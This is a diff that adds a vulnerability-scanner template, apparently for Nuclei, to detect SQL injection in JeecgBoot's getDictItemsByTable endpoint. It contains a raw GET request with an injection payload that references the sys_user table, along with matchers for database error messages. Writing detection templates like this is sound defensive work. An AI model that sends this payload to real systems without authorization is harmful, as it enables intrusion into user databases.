@@ -1,0 +1,26 @@
+id: jeecgboot-sql-injection
+
+info:
+  name: JeecgBoot SQL Injection Detection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects potential SQL injection vulnerability in JeecgBoot via the /api/sys/ng-alain/getDictItemsByTable endpoint.
+
+http:
+  - raw:
+      - |
+        GET /api/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+          - 400
+      - type: regex
+        regex:
+          - "SQL syntax.*MySQL"
+          - "Unclosed quotation mark after the character string"
+          - "near '.*' at line"
